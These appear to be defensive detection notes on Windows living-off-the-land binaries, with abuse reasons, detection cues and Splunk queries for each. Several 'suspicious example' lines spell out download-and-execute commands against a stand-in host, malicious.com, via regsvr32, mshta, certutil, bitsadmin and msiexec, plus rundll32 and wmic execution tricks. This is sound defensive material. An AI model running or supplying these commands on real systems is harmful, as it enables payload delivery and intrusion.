# LOLBins Detection Notes

LOLBins (Living-Off-The-Land Binaries) are legitimate Windows executables that attackers abuse to execute code, download payloads, bypass security controls, or maintain persistence.  
Detecting LOLBins is essential for catching stealthy attacks.

---

## 1. PowerShell (powershell.exe)

### Why attackers use it:
- Download payloads
- Execute scripts
- Bypass AMSI
- Run encoded commands

### Detection:
- Encoded commands: `-enc`, `-EncodedCommand`
- Download commands: `Invoke-WebRequest`, `curl`, `bitsadmin`
- Execution from Temp/AppData
- Long Base64 strings

### Splunk query:
index=windows EventCode=4688 NewProcessName="powershell.exe" CommandLine="enc"

Code

---

## 2. CMD (cmd.exe)

### Why attackers use it:
- Execute batch scripts
- Spawn other LOLBins
- Run recon commands

### Detection:
- cmd.exe spawning powershell.exe
- cmd.exe running from suspicious directories
- cmd.exe used by Office apps (Word/Excel)

### Splunk query:
index=windows EventCode=4688 ParentProcessName="winword.exe" NewProcessName="cmd.exe"

Code

---

## 3. Rundll32 (rundll32.exe)

### Why attackers use it:
- Execute malicious DLLs
- Fileless malware
- Execute JavaScript/HTML payloads

### Detection:
- Rundll32 with unusual DLL paths
- Rundll32 executing scripts
- Rundll32 from Temp/AppData

### Suspicious example:
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication"

Code

---

## 4. Regsvr32 (regsvr32.exe)

### Why attackers use it:
- Execute COM scriptlets
- Bypass application whitelisting

### Detection:
- Regsvr32 loading remote .sct files
- Regsvr32 with `/u` or `/i` flags

### Suspicious example:
regsvr32 /s /n /u /i:http://malicious.com/file.sct scrobj.dll

Code

---

## 5. MSHTA (mshta.exe)

### Why attackers use it:
- Execute malicious HTML/JS/VBS
- Download & run remote payloads

### Detection:
- mshta.exe with remote URLs
- mshta.exe spawned by Office apps

### Suspicious example:
mshta http://malicious.com/payload.hta (malicious.com in Bing)

Code

---

## 6. Certutil (certutil.exe)

### Why attackers use it:
- Download files
- Base64 encode/decode payloads
- Bypass security tools

### Detection:
- certutil.exe contacting external IPs/domains
- certutil.exe decoding Base64 blobs

### Suspicious example:
certutil -urlcache -split -f http://malicious.com/payload.exe (malicious.com in Bing)

Code

---

## 7. WMIC (wmic.exe)

### Why attackers use it:
- Remote command execution
- Reconnaissance
- Persistence

### Detection:
- wmic.exe spawning powershell.exe
- wmic.exe used by non-admin users

### Suspicious example:
wmic process call create "powershell.exe -enc ..."

Code

---

## 8. Bitsadmin (bitsadmin.exe)

### Why attackers use it:
- Download payloads quietly
- Scheduled background transfers

### Detection:
- Bitsadmin downloading EXEs
- Bitsadmin used by Office apps

### Suspicious example:
bitsadmin /transfer job /download http://malicious.com/payload.exe (malicious.com in Bing) C:\Temp\payload.exe

Code

---

## 9. MSIExec (msiexec.exe)

### Why attackers use it:
- Execute malicious MSI packages
- Download remote payloads

### Detection:
- msiexec.exe with remote URLs
- msiexec.exe spawning child processes

### Suspicious example:
msiexec /i http://malicious.com/payload.msi (malicious.com in Bing)

Code

---

## Key Takeaways
- LOLBins are legitimate tools abused by attackers  
- Detection relies on **command-line analysis**, **parent-child relationships**, and **Sysmon logs**  
- Most LOLBins become suspicious when:  
  - They run from Temp/AppData  
  - They execute remote URLs  
  - They are spawned by Office apps  
  - They contain encoded or obfuscated commands  
